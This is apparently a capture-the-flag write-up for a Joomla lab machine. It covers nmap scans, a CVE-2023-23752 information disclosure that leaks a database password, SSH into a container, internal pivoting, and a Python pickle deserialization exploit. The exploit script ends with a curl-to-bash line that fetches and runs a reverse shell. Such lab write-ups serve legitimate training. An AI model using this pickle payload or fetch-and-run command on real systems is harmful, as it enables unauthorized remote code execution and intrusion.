---
tags:
  - web
  - THM
  - Joomla
  - Pivoting
  - Pickle
---

We strat with nmap:
```sh
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 85:ee:49:01:fb:aa:69:3a:80:ab:71:b4:07:e5:f5:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAwEABWxPePVy1o90bWizj8OtvD4hKnzhf/3I/tTkjdPpft+UOw2+6VCYDMCq8782S2q8keHpUPVoeVGx08jVzs=
|   256 0b:0d:65:a1:d7:f3:49:8e:73:8d:6e:c1:6a:af:11:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILUFBYWlsyf4Y166QcHNQ32/+QqI7AMr1M0ZB/3FRvoU
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 16 disallowed entries
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
2222/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:4a:7e:34:01:09:f8:68:d8:f7:dd:b8:57:d4:17:cf (RSA)
| ssh-rsa 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Looking at port 80, we found we have `joomla` CMS, and its version `4.2.7`:
```
msf auxiliary(scanner/http/joomla_version) > run
[*] Server: Apache/2.4.58 (Ubuntu)
[+] Joomla version: 4.2.7 
```
mail@tourism.thm
Searching online, we found there is unauthenticated information disclouser that dumps database. [Here](https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/blob/main/exploit.sh)
```
./exploit.sh http://10.10.140.164

Users:
{
  "id": 377,
  "name": "root",
  "username": "root",
  "email": "mail@tourism.thm",
  "groups": "Super Users"
}
{
  "dbtype": "mysqli",
  "id": 224
}
{
  "host": "localhost",
  "id": 224
}
{
  "user": "root",
  "id": 224
}
{
  "password": "RootPassword@1234",
  "id": 224
}
{
  "db": "joomla_db",
  "id": 224
}
{
  "dbprefix": "ecsjh_",
  "id": 224
}

{
  "editor": "tinymce",
  "id": 224
}

```

Doing ssh:
```
ssh root@10.10.140.164 -p 2222

RootPassword@1234
```

We found we are in container, running `./deepce.sh` for enumeration, Those are some usefull informations:
```
[+] Container IP ............ 192.168.100.10
[+] DNS Server(s) ........... 127.0.0.11
[+] Host IP ................. 192.168.100.1

[+] Attempting ping sweep of 192.168.100.0/24 (nmap)
Host: 192.168.100.1 (ip-192-168-100-1.eu-west-1.compute.internal)       Status: Up
Host: 192.168.100.12 (voyage_priv2.joomla-net)  Status: Up
Host: 192.168.100.10 (f5eb774507f2)     Status: Up
======================================( Scanning Host )=======================================
[+] Scanning host 192.168.100.1 (nmap) Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-05 10:46 UTC
Nmap scan report for ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1)
Host is up (0.0000050s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
5000/tcp open  upnp
MAC Address: 02:42:9C:47:A8:3A (Unknown)

```

Internal network enumeration:
`192.168.100.1`
```sh
nmap -sV -sC -vv 192.168.100.1 -T4

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-generator: Joomla! - Open Source Content Management
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 16 disallowed entries
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
2222/tcp open  ssh        syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) # This map to my container --> 192.168.100.10:22
5000/tcp open  tcpwrapped syn-ack ttl 64

[+] Scanning host 192.168.100.1 (nmap) Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-05 10:46 UTC
Nmap scan report for ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1)
Host is up (0.0000050s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
5000/tcp open  upnp

```

`192.168.100.10`: My Current container IP.
```sh
nmap -sV -sC -vv 192.168.100.10 -T4

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`192.168.100.12`
```sh
nmap -sV -sC -vv 192.168.100.12 -T4

Discovered open port 5000/tcp on 192.168.100.12
```

looking at `192.168.100.12` i found web page with default credentials `admin:admin` and then we got wired looking cookie:
```
80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e
```


> [!NOTE] Double pivote
> we have made listener inside the docker: `4440 -> http  |  4444 -> reverse_shell`


which is **Python pickle**, we can put our commands and put them as serialzed object using this script:
```python
import pickle
import os

class RCE:
	def __reduce__(self):
		return (os.system, ('curl http://192.168.100.10:4440/reverse | /usr/bin/bash',))
malicious = pickle.dumps(RCE())
print("Malicious payload (hex):", malicious.hex())
```